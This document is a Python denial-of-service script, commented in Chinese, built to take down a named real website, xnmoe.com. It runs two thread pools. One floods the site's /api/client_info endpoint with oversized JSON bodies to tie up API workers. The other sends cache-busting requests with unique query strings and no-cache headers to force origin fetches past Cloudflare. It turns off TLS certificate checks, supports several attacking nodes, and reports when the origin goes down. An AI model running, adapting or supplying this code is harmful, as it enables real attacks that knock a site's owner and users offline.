#!/usr/bin/env python3
"""
最终瘫痪攻击 - 组合策略
1. client_info DoS (耗尽 API Worker)
2. 缓存穿透 (每次唯一 URL 强制源站回源)
3. 目标: 让源站完全瘫痪，Cloudflare 也无法代理
"""
import urllib.request
import urllib.error
import json
import time
import threading
import random
import os
import ssl
import uuid

TARGET = "https://www.xnmoe.com"
DURATION = int(os.environ.get("DURATION", "300"))
WORKERS = int(os.environ.get("WORKERS", "10"))
NODE_ID = os.environ.get("NODE_ID", "0")

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

stats = {
    "api_hangs": 0,    # client_info 挂起连接数
    "cache_miss": 0,   # 缓存穿透请求数
    "static_ok": 0,    # 静态页面正常
    "static_err": 0,   # 静态页面失败
    "origin_down": False
}
lock = threading.Lock()
running = True

# 静态页面列表 - 全部用缓存穿透参数
STATIC_PAGES = [
    "/",
    "/guestbook.html",
    "/post.html",
    "/about.html",
    "/friends.html",
    "/project.html",
]


def api_hang_worker(wid):
    """Worker: 通过 client_info 挂起 API worker"""
    seq = 0
    while running:
        seq += 1
        try:
            body = json.dumps({
                "client_id": str(uuid.uuid4()),
                "user_agent": "M" * 1000,
                "extra_data": "X" * 10000,
                "plugins": [f"P-{i}" for i in range(100)],
            }).encode()

            req = urllib.request.Request(
                f"{TARGET}/api/client_info",
                data=body,
                headers={
                    "Content-Type": "application/json",
                    "Origin": TARGET,
                    "User-Agent": f"Paralyzer-{NODE_ID}-{wid}"
                }
            )
            # 不等待响应 - 直接让连接挂起
            urllib.request.urlopen(req, timeout=30, context=ssl_ctx)
            # 如果能到这里说明服务器响应了（不太可能）
            with lock:
                stats["api_hangs"] += 1
        except:
            # 预期的超时 - 连接挂起了 30 秒
            with lock:
                stats["api_hangs"] += 1
        time.sleep(0.1)


def static_bust_worker(wid):
    """Worker: 缓存穿透 - 每个请求唯一 URL 强制回源"""
    seq = 0
    while running:
        seq += 1
        page = random.choice(STATIC_PAGES)
        bust = f"{uuid.uuid4().hex[:8]}_{seq}"
        url = f"{TARGET}{page}?_cb={bust}&_ts={int(time.time()*1000)}"
        
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": f"Mozilla/5.0 Paralyzer-{NODE_ID}",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            })
            resp = urllib.request.urlopen(req, timeout=15, context=ssl_ctx)
            code = resp.status
            resp.read()
            with lock:
                stats["cache_miss"] += 1
                if code == 200:
                    stats["static_ok"] += 1
                else:
                    stats["static_err"] += 1
        except Exception as e:
            err = str(e)
            with lock:
                stats["cache_miss"] += 1
                stats["static_err"] += 1
                if "timed out" in err.lower() or "refused" in err.lower():
                    if not stats["origin_down"]:
                        stats["origin_down"] = True
                        print(f"\n  *** ORIGIN DOWN DETECTED! ***\n")
        time.sleep(0.2)


def monitor():
    """状态监控"""
    t0 = time.time()
    while running:
        time.sleep(10)
        with lock:
            hang = stats["api_hangs"]
            miss = stats["cache_miss"]
            ok = stats["static_ok"]
            err = stats["static_err"]
            down = stats["origin_down"]
        
        elapsed = time.time() - t0
        status = "DOWN" if down else "DEGRADED" if err > ok * 0.3 else "OK"
        print(f"  [{time.strftime('%H:%M:%S')}] {elapsed:.0f}s | "
              f"Client: {status} | "
              f"Hangs:{hang} Cache:{miss} | "
              f"Static OK:{ok} ERR:{err}", flush=True)


def main():
    global running
    print(f"\n{'='*60}")
    print(f" FINAL STRIKE: 源站瘫痪攻击")
    print(f" Node: {NODE_ID} | Workers: {WORKERS}")
    print(f" Duration: {DURATION}s")
    print(f" Strategy: API hang + Cache busting")
    print(f"{'='*60}\n")
    
    # 启动监控
    threading.Thread(target=monitor, daemon=True).start()
    
    # 一半 worker 做 API 挂起，一半做缓存穿透
    api_count = WORKERS // 2
    bust_count = WORKERS - api_count
    
    for i in range(api_count):
        threading.Thread(target=api_hang_worker, args=(i,), daemon=True).start()
    for i in range(bust_count):
        threading.Thread(target=static_bust_worker, args=(i,), daemon=True).start()
    
    # 等待结束
    time.sleep(DURATION)
    running = False
    time.sleep(2)
    
    with lock:
        hang = stats["api_hangs"]
        miss = stats["cache_miss"]
        ok = stats["static_ok"]
        err = stats["static_err"]
        down = stats["origin_down"]
    
    print(f"\n{'='*60}")
    print(f" FINAL: Hangs {hang} | Cache Miss {miss}")
    print(f" Static: {ok} OK / {err} ERR")
    print(f" Origin Down: {down}")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
